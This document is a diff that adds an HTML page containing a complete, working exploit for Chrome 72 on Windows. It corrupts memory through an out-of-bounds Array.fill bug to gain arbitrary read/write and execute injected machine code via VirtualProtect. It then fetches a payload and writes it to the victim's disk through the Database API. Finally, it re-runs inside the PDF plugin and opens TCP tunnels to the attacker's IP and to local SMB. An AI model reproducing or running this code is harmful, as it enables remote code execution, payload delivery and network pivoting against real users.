@@ -1,0 +1,704 @@
+<body>
+<script>
+  VERSIONS = {
+    '72.0.3626.97' : {
+      IMAGE_BASE : 0x185e180,
+      MODULE_SINGLETON : 0x547b0f8,
+      TCP_SOCKET_API : 0x47bd578,
+      NET_ADDRESS_API : 0x47bcf00,
+      VIRTUAL_PROTECT : 0x53d0960,
+      GET_PROC_ADDRESS : 0x53d03c0,
+      GET_MODULE_HANDLE : 0x53d0378,
+      DOCUMENT_TITLE : 0x688,
+      RENDER_THREAD_CURRENT : 0x79b82,
+      OPEN_FILE : 0x2d8f5de,
+      DELETE_FILE : 0x2d8f680
+    }
+  };
+ 
+  BIG_BUFFER_SIZE = 16 * 1024 * 1024;
+  RWX_BUFFER_SIZE = 1024 * 1024;
+  SIZEOF_PVOID = 8;
+ 
+/* ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ */
+ 
+  roundUp = (value, multiple) => (value + multiple - 1) & ~(multiple - 1);
+ 
+  function forceGC() {
+    for (let i = 0; i < 100000; ++i) {
+      let buf = new ArrayBuffer();
+    }
+  }
+ 
+  sleep = timeout => new Promise(resolve => setTimeout(resolve, timeout));
+ 
+  BigInt.prototype.hex = function() {
+    return this.toString(16);
+  }
+ 
+  BigInt.prototype.asBytes = function() {
+    let val = this,
+        result = [];
+    for (let i = 0; i < SIZEOF_PVOID; ++i) {
+      result.push(Number(val & 0xffn));
+      val = val >> 8n;
+    }
+    return result;
+  }
+ 
+  ptr = BigInt;
+ 
+    const
+    IN_HTML = 0,
+    IN_PDF = 1;
+    let ExploitStage;
+ 
+    if (typeof app == 'object') {
+    ExploitStage = IN_PDF;
+ 
+    // make pdf functions behave like the regular ones
+    alert = app.alert.bind(app);
+    timeout_functions = [];
+    setInterval = (func, interval) => {
+      timeout_functions.push(func);
+      return app.setInterval(`timeout_functions[${timeout_functions.length - 1}]()`, interval);
+    }
+    clearInterval = app.clearInterval.bind(app);
+    setTimeout = (func, timeout) => {
+      timeout_functions.push(func);
+      return app.setTimeOut(`timeout_functions[${timeout_functions.length - 1}]()`, timeout);
+    }
+  } else {
+    ExploitStage = IN_HTML;
+    }
+ 
+  OFFSETS = null;
+  for (var version in VERSIONS) {
+    if (navigator.userAgent.includes(version)) {
+      OFFSETS = VERSIONS[version];
+      break;
+    }
+  }
+ 
+  if (!OFFSETS) {
+    throw alert('This version of Chrome is not supported. Please attach WinDBG to the renderer '
+        + 'process and type\n\n$$>< path\\to\\offsets.wds');
+  }
+ 
+  if (ExploitStage == IN_HTML) {
+    if (!/^\d+\.\d+\.\d+\.\d+$/.test(location.hostname)) {
+      throw alert('The host name should look like an IP address.');
+    }
+    ip_addr = escape(location.hostname);
+ 
+    document.body.style.opacity = 0;
+  }
+ 
+/* ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ */
+ 
+  let data_view = new DataView(new ArrayBuffer(8));
+  floatAsQword = float => {
+    data_view.setFloat64(0, float);
+    return data_view.getBigUint64(0);
+  }
+ 
+  qwordAsFloat = qword => {
+    data_view.setBigUint64(0, qword);
+    return data_view.getFloat64(0);
+  }
+ 
+  let oob_access_array;
+  let ptr_leak_object;
+  let arbirary_access_array;
+  let ptr_leak_index;
+  let external_ptr_index;
+  let external_ptr_backup;
+  const MARKER = 0x31337;
+  const MARKER_TWO = 0x31338;
+ 
+  leakPtr = obj => {
+    ptr_leak_object[0] = obj;
+    return floatAsQword(oob_access_array[ptr_leak_index]);
+  }
+ 
+  getQword = address => {
+    oob_access_array[external_ptr_index] = qwordAsFloat(address);
+    let value = arbirary_access_array[0];
+    oob_access_array[external_ptr_index] = external_ptr_backup;
+    return value;
+  }
+ 
+  setQword = (address, value) => {
+    oob_access_array[external_ptr_index] = qwordAsFloat(address);
+    arbirary_access_array[0] = value;
+    oob_access_array[external_ptr_index] = external_ptr_backup;
+  }
+ 
+ 
+  setQwords = (address, array) => {
+    for (let i = 0; i < array.length; ++i) {
+      setQword(address + ptr(i * SIZEOF_PVOID), array[i]);
+    }
+  }
+ 
+  let getField = (object_ptr, num, tagged = true) =>
+    object_ptr + ptr(num * SIZEOF_PVOID - (tagged ? 1 : 0));
+ 
+ 
+  getDword = address => {
+    return getQword(address) & 0xffffffffn;
+  }
+ 
+  setDword = (address, value) => {
+    let data = getQword(address) & ~(0xffffffffn) | (value & 0xffffffffn);
+    setQword(address, data);
+  }
+ 
+  getByte = (address, value) => {
+    return Number(getQword(address, value) & 0xffn);
+  }
+ 
+  setByte = (address, value) => {
+    let data = getQword(address) & ~(0xffn) | ptr(value & 0xff);
+    setQword(address, data);
+  }
+ 
+  getBytes = (address, length) => {
+    let result = [];
+ 
+    for (i = 0; i < length; ++i) {
+      result.push(getByte(address + ptr(i)));
+    }
+ 
+    return result;
+  }
+ 
+  setBytes = (address, array) => {
+    array = array.flat(10);
+    for (let i = 0; i < array.length; ++i) {
+      setByte(address + ptr(i), array[i]);
+    }
+  }
+ 
+  triggerOob = () => {
+    array = [];
+    array.length = 0xffffffff;
+    ptr_leak_object = {};
+    arbirary_access_array = new BigUint64Array(1);
+ 
+    oob_access_array = array.fill(1.1, 0x80000000 - 1, {valueOf() {
+      array.length = 32;
+      array.fill(1.1);
+      return 0x80000000;
+    }});
+    ptr_leak_object[0] = MARKER;
+    arbirary_access_array.buffer;
+  }
+ 
+  findOffsets = () => {
+    let markerAsFloat = qwordAsFloat(BigInt(MARKER) << 32n);
+    let markerTwoAsFloat = qwordAsFloat(BigInt(MARKER_TWO) << 32n);
+    for (ptr_leak_index = 0; ptr_leak_index < oob_access_array.length;
+        ++ptr_leak_index) {
+      if (oob_access_array[ptr_leak_index] === markerAsFloat) {
+        // double check
+        ptr_leak_object[0] = MARKER_TWO;
+        let saved_value = oob_access_array[ptr_leak_index];
+        ptr_leak_object[0] = MARKER;
+        if (saved_value !== markerTwoAsFloat) {
+          continue;
+        }
+ 
+        break;
+      }
+    }
+ 
+    let oneAsFloat = qwordAsFloat(1n << 32n);
+    for (external_ptr_index = 2; external_ptr_index < oob_access_array.length;
+        ++external_ptr_index) {
+      if (oob_access_array[external_ptr_index - 2] === oneAsFloat &&
+          oob_access_array[external_ptr_index - 1] === 0) {
+        break;
+      }
+    }
+ 
+    if (ptr_leak_index === oob_access_array.length ||
+        external_ptr_index === oob_access_array.length) {
+      throw alert(`Couldn't locate the offsets`);
+    }
+ 
+    external_ptr_backup = oob_access_array[external_ptr_index];
+  }
+ 
+  findRWXPage = () => {
+    function module(stdlib, foreign, buffer) {
+      'use asm';
+      var array = new stdlib.Uint32Array(buffer);
+      function func(x) {
+        x = x | 0;
+        array[0] = x;
+      }
+      return func;
+    }
+    asmjs_func = module({Uint32Array:Uint32Array}, {}, new ArrayBuffer(1 << 12));
+ 
+    asmjs_func_ptr = leakPtr(asmjs_func);
+    shared_data_ptr = getQword(getField(asmjs_func_ptr, 3));
+    wasm_data_ptr = getQword(getField(shared_data_ptr, 1));
+    wasm_instance_ptr = getQword(getField(wasm_data_ptr, 2));
+    jump_table_ptr = getQword(getField(wasm_instance_ptr, 29));
+  }
+ 
+  // put these two objects into the old space
+  read_write_ptr_array = new BigUint64Array(1);
+  read_write_data_array = new BigUint64Array(1);
+  permanent_ptr_leak_object = {};
+  permanent_ptr_leak_object[0] = {};
+ 
+  forceGC();
+  forceGC();
+ 
+  triggerOob();
+  findOffsets();
+  findRWXPage();
+ 
+  // fix the oob array to avoid GC crashes
+  oob_access_array_ptr = leakPtr(oob_access_array);
+  oob_fixed_array_ptr = getQword(getField(oob_access_array_ptr, 2));
+  setQword(getField(oob_fixed_array_ptr, 1), 0n);
+ 
+  // turn the temporary read-write into the permanent one
+  read_write_data_array_ptr = leakPtr(read_write_data_array);
+  read_write_data_elements_ptr = getQword(getField(read_write_data_array_ptr, 2));
+  setQword(getField(read_write_data_elements_ptr, 3), 0n);
+  read_write_data_backing_ptr = getField(read_write_data_elements_ptr, 2);
+ 
+  read_write_ptr_array_ptr = leakPtr(read_write_ptr_array);
+  read_write_ptr_elements_ptr = getQword(getField(read_write_ptr_array_ptr, 2));
+  setQword(getField(read_write_ptr_elements_ptr, 3), 0n);
+  setQword(getField(read_write_ptr_elements_ptr, 2), read_write_data_backing_ptr);
+ 
+  permanent_ptr_leak_object_ptr = leakPtr(permanent_ptr_leak_object);
+  permanent_ptr_leak_elements_ptr = getQword(getField(permanent_ptr_leak_object_ptr, 2));
+  permanent_ptr_leak_field_ptr = getField(permanent_ptr_leak_elements_ptr, 2);
+  leakPtr = obj => {
+    permanent_ptr_leak_object[0] = obj;
+    return getQword(permanent_ptr_leak_field_ptr);
+  }
+ 
+  getQword = address => {
+    read_write_ptr_array[0] = address;
+    return value = read_write_data_array[0];
+  }
+ 
+  setQword = (address, value) => {
+    read_write_ptr_array[0] = address;
+    read_write_data_array[0] = value;
+  }
+ 
+  big_array = Array(BIG_BUFFER_SIZE / SIZEOF_PVOID).fill(2.2);
+  big_array_ptr = leakPtr(big_array);
+  big_buffer_ptr = getQword(getField(big_array_ptr, 2)) + ptr(0x1000 - 1);
+ 
+  // we need a way to perform raw data allocations
+  alloc_struct = {
+    'rw': {
+      base: big_buffer_ptr,
+      offset: 0,
+      size: BIG_BUFFER_SIZE - 0x1000,
+    },
+    'rwx': {
+      base: 0,
+      offset: 0,
+      size: RWX_BUFFER_SIZE,
+    }
+  };
+ 
+  function malloc(size, executable = false) {
+    size = roundUp(size, 8);
+    let struct = alloc_struct[executable ? 'rwx' : 'rw'];
+    if (struct.offset + size > struct.size) {
+      throw alert(`OOM\nSize: ${size}\nExecutable: ${executable}\nStack:\n${(new Error).stack}`);
+    }
+ 
+    let result = struct.base + ptr(struct.offset);
+    struct.offset += size;
+    return result;
+  }
+ 
+  rwx_buffer_ptr = malloc(RWX_BUFFER_SIZE);
+  alloc_struct['rwx'].base = rwx_buffer_ptr;
+ 
+  memory_chunk_mask = ((1n << 19n) - 1n) ^ ((1n << 64n) - 1n);
+  memory_chunk_ptr = asmjs_func_ptr & memory_chunk_mask;
+  old_space_ptr = getQword(memory_chunk_ptr + 0x40n);
+  old_space_dtr_ptr = getQword(getQword(old_space_ptr));
+  chrome_child_base_ptr = old_space_dtr_ptr - ptr(OFFSETS.IMAGE_BASE);
+  virtual_protect_ptr_ptr = chrome_child_base_ptr + ptr(OFFSETS.VIRTUAL_PROTECT);
+ 
+  virtual_protect_code = [
+    0x48, 0xB9, rwx_buffer_ptr.asBytes(), // mov rcx, rwx_buffer_ptr
+    0x48, 0xBA, ptr(RWX_BUFFER_SIZE).asBytes(), // mov rdx, RWX_BUFFER_SIZE
+    0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00, // mov r8, 0x40
+    0x49, 0xB9, rwx_buffer_ptr.asBytes(), // mov r9, tempAddress
+    0x48, 0x83, 0xEC, 0x20, // sub rsp, 0x20
+    0x48, 0xB8, virtual_protect_ptr_ptr.asBytes(), // mov rax, virtual_protect_ptr_ptr
+    0xFF, 0x10, // call [rax]
+    0x48, 0x83, 0xC4, 0x20, // add rsp, 0x20
+    0xC3, // ret
+  ];
+ 
+  backup = getBytes(jump_table_ptr, virtual_protect_code.length);
+  setBytes(jump_table_ptr, virtual_protect_code);
+  asmjs_func();
+  setBytes(jump_table_ptr, backup);
+ 
+  function allocCode(code) {
+    code = code.flat(10);
+    let ptr = malloc(code.length, true);
+    setBytes(ptr, code);
+    return ptr;
+  }
+ 
+  // build a harness for calling API functions
+  module_ptr = getQword(chrome_child_base_ptr + ptr(OFFSETS.MODULE_SINGLETON));
+  instance_map_ptr = getQword(module_ptr + ptr(8));
+  instance_ptr = getQword(instance_map_ptr);
+  pp_instance = getQword(instance_ptr + ptr(0x20));
+  tcp_socket_api_ptr = chrome_child_base_ptr + ptr(OFFSETS.TCP_SOCKET_API);
+  net_address_api_ptr = chrome_child_base_ptr + ptr(OFFSETS.NET_ADDRESS_API);
+  api_table = {
+    'TCPSocket' :
+    {
+      'Create' : getQword(tcp_socket_api_ptr),
+      'Bind' : getQword(tcp_socket_api_ptr + ptr(2 * SIZEOF_PVOID)),
+      'Connect' : getQword(tcp_socket_api_ptr + ptr(3 * SIZEOF_PVOID)),
+      'Read' : getQword(tcp_socket_api_ptr + ptr(6 * SIZEOF_PVOID)),
+      'Write' : getQword(tcp_socket_api_ptr + ptr(7 * SIZEOF_PVOID)),
+      'Listen' : getQword(tcp_socket_api_ptr + ptr(8 * SIZEOF_PVOID)),
+      'Accept' : getQword(tcp_socket_api_ptr + ptr(9 * SIZEOF_PVOID)),
+      'Close' : getQword(tcp_socket_api_ptr + ptr(10 * SIZEOF_PVOID)),
+    },
+    'NetAddress' :
+    {
+      'CreateFromIPv4Address' : getQword(net_address_api_ptr),
+    },
+    'kernel32' :
+    {
+      'VirtualProtect': getQword(virtual_protect_ptr_ptr),
+      'GetModuleHandleW' : getQword(chrome_child_base_ptr + ptr(OFFSETS.GET_MODULE_HANDLE)),
+      'GetProcAddress' : getQword(chrome_child_base_ptr + ptr(OFFSETS.GET_PROC_ADDRESS))
+    },
+    'chrome_child' : {
+      'RenderThreadImpl::current' : chrome_child_base_ptr + ptr(OFFSETS.RENDER_THREAD_CURRENT),
+      'RendererBlinkPlatformImpl::DatabaseOpenFile' : chrome_child_base_ptr
+          + ptr(OFFSETS.OPEN_FILE),
+      'RendererBlinkPlatformImpl::DatabaseDeleteFile' : chrome_child_base_ptr
+          + ptr(OFFSETS.DELETE_FILE)
+    }
+  };
+ 
+  callApi = (module, name, async, ...args) => {
+    let ret_value_ptr = malloc(SIZEOF_PVOID),
+        callback_struct_ptr = malloc(3 * SIZEOF_PVOID),
+        completion_flag_ptr = malloc(SIZEOF_PVOID),
+        callback_ptr = allocCode([
+          0x48, 0xB9, ret_value_ptr.asBytes(), // mov rcx, ret_value_ptr
+          0x48, 0x89, 0x11, // mov qword ptr[rcx], rdx
+          0x48, 0xB9, completion_flag_ptr.asBytes(), // mov rcx, completion_flag_ptr
+          0x48, 0xC7, 0x01, 0x01, 0x00, 0x00, 0x00, // mov qword ptr[rcx], 1
+          0xC3 // ret
+        ]);
+    setQwords(callback_struct_ptr, [
+      callback_ptr,
+      0n,
+      0n,
+    ]);
+ 
+    if (async) {
+      setQword(completion_flag_ptr, 0n);
+      args.push(callback_struct_ptr);
+    }
+ 
+    let optionalArg = (index, ...code) => args.length > index ? [code, args[index].asBytes()] : [],
+        additionalArgs = _ => {
+          let result = [];
+          for (let i = args.length - 1; i >= 4; --i) {
+            result.push([
+              0x48, 0xB8, args[i].asBytes(), // mov rax, args[i]
+              0x48, 0x89, 0x44, 0x24, i * SIZEOF_PVOID // mov [rsp + ...], rax
+            ]);
+          }
+          return result;
+        },
+        args_space_size = Math.max(roundUp(args.length * SIZEOF_PVOID, 0x10), 0x20);
+ 
+    let func_buffer_ptr = allocCode([
+      // a caller has to keep the stack aligned
+      0x48, 0xC7, 0xC0, 0x08, 0x00, 0x00, 0x00, // mov rax, 8
+      0x48, 0x85, 0xE0, // test rsp, rax
+      0x74, 0x03, // jz +3
+      0x48, 0x31, 0xC0, // xor rax, rax
+      0x48, 0x29, 0xC4, // sub rsp, rax
+      0x50, // push rax
+      0x48, 0x83, 0xEC, args_space_size, // sub rsp, args_space_size
+      optionalArg(0, 0x48, 0xB9), // mov rcx, args[0]
+      optionalArg(1, 0x48, 0xBA), // mov rdx, args[1]
+      optionalArg(2, 0x49, 0xB8), // mov r8, args[2]
+      optionalArg(3, 0x49, 0xB9), // mov r9, args[3]
+      additionalArgs(),
+      0x48, 0xB8, api_table[module][name].asBytes(), // mov rax, api_table[module][name]
+      0xFF, 0xD0, // call rax
+      0x48, 0x83, 0xC4, args_space_size, // add rsp, args_space_size
+      0x48, 0xB9, ret_value_ptr.asBytes(), // mov rcx, ret_value_ptr
+      0x48, 0x89, 0x01, // mov qword ptr[rcx], rax
+      0x58, // pop rax
+      0x48, 0x01, 0xC4, // add rsp, rax
+      0xC3 // ret
+    ]);
+ 
+    let asmjs_func_ptr = leakPtr(asmjs_func),
+        shared_data_ptr = getQword(getField(asmjs_func_ptr, 3)),
+        wasm_data_ptr = getQword(getField(shared_data_ptr, 1)),
+        wasm_instance_ptr = getQword(getField(wasm_data_ptr, 2)),
+        jump_table_field_ptr = getField(wasm_instance_ptr, 29),
+        jump_table_backup = getQword(jump_table_field_ptr);
+    setQword(jump_table_field_ptr, func_buffer_ptr);
+    asmjs_func();
+    setQword(jump_table_field_ptr, jump_table_backup);
+ 
+    if (async) {
+      if (getDword(ret_value_ptr) != 0xffffffffn) {
+        throw alert(`Async function ${name} didn't return PP_OK_COMPLETIONPENDING, `
+            + `instead returned ${getDword(ret_value_ptr).hex()}`);
+      }
+      return new Promise(resolve => {
+        let interval_id = setInterval(_ => {
+          if (getQword(completion_flag_ptr) != 1n) {
+            return;
+          }
+ 
+          clearInterval(interval_id);
+          resolve(getQword(ret_value_ptr));
+        }, 100);
+      });
+    } else {
+      return Promise.resolve(getQword(ret_value_ptr));
+    }
+  }
+ 
+  if (ExploitStage == IN_HTML) {
+    function makeString(string) {
+      let bytes = Array.prototype.map.call(string + '\x00', char => char.charCodeAt(0));
+      let str_ptr = malloc(bytes.length);
+      setBytes(str_ptr, bytes);
+      return str_ptr;
+    }
+ 
+    function makeWideString(string) {
+      let bytes = Array.prototype.map.call(string + '\x00', char => {
+        let code = char.charCodeAt(0);
+        return [code & 0xff, code >> 8];
+      }).flat(10);
+      let str_ptr = malloc(bytes.length);
+      setBytes(str_ptr, bytes);
+      return str_ptr;
+    }
+ 
+ 
+    function fromWideString(string_ptr) {
+      let chars = [];
+      for (let i = 0; /* infinite loop */ ; i += 2) {
+        let code = Number(getQword(string_ptr + ptr(i)) & 0xffffn);
+        if (code === 0) {
+          break;
+        }
+        chars.push(String.fromCharCode(code));
+      }
+      return chars.join('');
+    }
+ 
+    doc_ptr = leakPtr(document);
+    blink_doc_ptr = getQword(getField(doc_ptr, 4));
+ 
+    function makeWebkitString(string) {
+      document.title = string;
+      let string_impl_ptr = getQword(blink_doc_ptr + ptr(OFFSETS.DOCUMENT_TITLE));
+      setDword(string_impl_ptr, getDword(string_impl_ptr) + 1n); // refCount
+      let str_ptr = malloc(SIZEOF_PVOID);
+      setQword(str_ptr, string_impl_ptr);
+      return str_ptr;
+    }
+ 
+    module_handles = {};
+    async function addFunction(module, name) {
+      if (!module_handles[module]) {
+        module_handles[module] = await callApi('kernel32','GetModuleHandleW', false,
+            makeWideString(module));
+      }
+ 
+      api_table[module][name] =
+        await callApi(module, 'GetProcAddress', false, module_handles[module], makeString(name));
+    }
+ 
+    (async () => {
+      // use the Database API to put a file with the payload on a user's disk
+      payload_array = Array.from(new Uint8Array(await (await fetch('payload')).arrayBuffer()));
+      payload_buf_ptr = malloc(payload_array.length);
+      setBytes(payload_buf_ptr, payload_array);
+ 
+      addFunction('kernel32', 'GetFinalPathNameByHandleW');
+      addFunction('kernel32', 'WriteFile');
+      addFunction('kernel32', 'SetEndOfFile');
+      addFunction('kernel32', 'CloseHandle');
+ 
+      render_thread_ptr = await callApi('chrome_child', 'RenderThreadImpl::current', false),
+      blink_platform_ptr = getQword(render_thread_ptr + ptr(0x2b8));
+      db = openDatabase('db', '1', '', 1024);
+ 
+      let origin_str = `${location.protocol.slice(0, -1)}_${location.hostname}_${location.port || 0}`;
+      let str_ptr = makeWebkitString(`${origin_str}/db#file`);
+      let file_handle = await callApi('chrome_child', 'RendererBlinkPlatformImpl::DatabaseOpenFile',
+          false, blink_platform_ptr, str_ptr, ptr(0x100 | 2 | 4));
+      await callApi('kernel32', 'WriteFile', false, file_handle, payload_buf_ptr,
+          ptr(payload_array.length), 0n, 0n);
+      await callApi('kernel32', 'SetEndOfFile', false, file_handle);
+ 
+      src_file_path_ptr = malloc(0x200);
+      let path_len = await callApi('kernel32', 'GetFinalPathNameByHandleW', false, file_handle,
+          src_file_path_ptr, ptr(0x200 - 1), ptr(4));
+      let src_file_path = escape(fromWideString(src_file_path_ptr, 0x200));
+ 
+      await callApi('kernel32', 'CloseHandle', false, file_handle);
+ 
+      // re-run the exploit inside the PDF plugin
+      let code = escape(document.getElementsByTagName('script')[0].textContent),
+          userAgent = escape(navigator.userAgent),
+          pdfContents =
+            `%PDF
+            1 0 obj
+            <<
+            /Pages 1 0 R
+            /OpenAction 2 0 R
+            >>
+            2 0 obj
+            <<
+              /S /JavaScript
+                /JS (
+                  ip_addr = unescape('${ip_addr}');
+                  src_file_path = unescape('${src_file_path}');
+                  navigator = { userAgent : unescape('${userAgent}') };
+                  try { eval(unescape('${code}')) } catch (e) { app.alert('e: ' + e.toString()) }
+                )
+            >>
+            trailer <<
+            /Root 1 0 R
+            >>`,
+      plugin = document.createElement('embed');
+      plugin.src = 'data:application/pdf,' + escape(pdfContents);
+      document.body.appendChild(plugin);
+ 
+      setTimeout(() => {
+        local_frame = document.body.appendChild(document.createElement('iframe'));
+        local_frame.src = 'http://localhost:8123';
+      }, 3000);
+    })();
+  } else if (ExploitStage == IN_PDF) {
+    async function createTunnel(first, second, type) {
+      let packet_num = 0;
+ 
+      function createPipe(from, to) {
+        let read_buffer_size = 1024 * 256,
+            read_buffer_ptr = malloc(read_buffer_size),
+            bytes_read = 0,
+            failed_attempts = 0;
+ 
+        (async () => {
+          while (true) {
+            if (type == 'http' && ++packet_num == 5) {
+              // python smb part started listening for a connection only at this point
+              await setUpSMB();
+            }
+ 
+            let bytes_read = await callApi('TCPSocket', 'Read', true, from, read_buffer_ptr,
+                ptr(read_buffer_size));
+            if (bytes_read == 0n) {
+              break;
+            } else if (bytes_read & 0x80000000n) {
+              if (++failed_attempts == 10) {
+                // too many errors
+                break;
+              }
+              await sleep(100);
+              continue;
+            }
+            failed_attempts = 0;
+            await callApi('TCPSocket', 'Write', true, to, read_buffer_ptr, ptr(bytes_read));
+          }
+        })();
+      }
+ 
+      createPipe(first, second);
+      createPipe(second, first);
+    }
+ 
+    function makeAddrStruct(ip, port) {
+      let bytes = [port >> 8, port & 0xff].concat(ip.split('.').map(octet => Number(octet))),
+          ptr = malloc(bytes.length);
+      setBytes(ptr, bytes);
+      return ptr;
+    }
+ 
+    async function setUpHTTP() {
+      let ipv4_addr_struct_ptr = makeAddrStruct('127.0.0.1', 8123);
+ 
+      let webserver_address_instance = await callApi('NetAddress', 'CreateFromIPv4Address', false,
+          pp_instance, ipv4_addr_struct_ptr);
+      let webserver_socket_instance = await callApi('TCPSocket', 'Create', false, pp_instance);
+      await callApi('TCPSocket', 'Bind', true, webserver_socket_instance,
+          webserver_address_instance);
+      let listen_ret = await callApi('TCPSocket', 'Listen', true, webserver_socket_instance, 10n);
+ 
+      let webserver_accepted_socket_ptr = malloc(SIZEOF_PVOID);
+      await callApi('TCPSocket', 'Accept', true, webserver_socket_instance,
+          webserver_accepted_socket_ptr);
+      let webserver_accepted_socket_instance = getQword(webserver_accepted_socket_ptr) & 0xffffffffn;
+ 
+      ipv4_addr_struct_ptr = makeAddrStruct(ip_addr, 8124);
+      let webclient_address_instance = await callApi('NetAddress', 'CreateFromIPv4Address', false,
+          pp_instance, ipv4_addr_struct_ptr);
+      let webclient_socket_instance = await callApi('TCPSocket', 'Create', false, pp_instance);
+      await callApi('TCPSocket', 'Connect', true, webclient_socket_instance,
+          webclient_address_instance);
+ 
+      createTunnel(webserver_accepted_socket_instance, webclient_socket_instance, 'http');
+    }
+ 
+    async function setUpSMB() {
+      let ipv4_addr_struct_ptr = makeAddrStruct(ip_addr, 8126);
+      let smbserver_address_instance = await callApi('NetAddress', 'CreateFromIPv4Address', false,
+          pp_instance, ipv4_addr_struct_ptr);
+      let smbserver_socket_instance = await callApi('TCPSocket', 'Create', false, pp_instance);
+      await callApi('TCPSocket', 'Connect', true, smbserver_socket_instance,
+          smbserver_address_instance);
+      let src_file_path_ptr = malloc(src_file_path.length + 2),
+          path_len_bytes = [src_file_path.length >> 8, src_file_path.length & 0xff];
+      setBytes(src_file_path_ptr,
+          path_len_bytes.concat(Array.from(src_file_path).map(char => char.charCodeAt(0))));
+      await callApi('TCPSocket', 'Write', true, smbserver_socket_instance, src_file_path_ptr,
+          ptr(src_file_path.length + 2));
+ 
+      ipv4_addr_struct_ptr = makeAddrStruct('127.0.0.1', 445);
+      let smbclient_address_instance = await callApi('NetAddress', 'CreateFromIPv4Address', false,
+          pp_instance, ipv4_addr_struct_ptr);
+      let smbclient_socket_instance = await callApi('TCPSocket', 'Create', false, pp_instance);
+      await callApi('TCPSocket', 'Connect', true, smbclient_socket_instance,
+          smbclient_address_instance);
+ 
+      createTunnel(smbserver_socket_instance, smbclient_socket_instance, 'smb');
+    }
+ 
+    setUpHTTP();
+  }
+</script>
+</body>
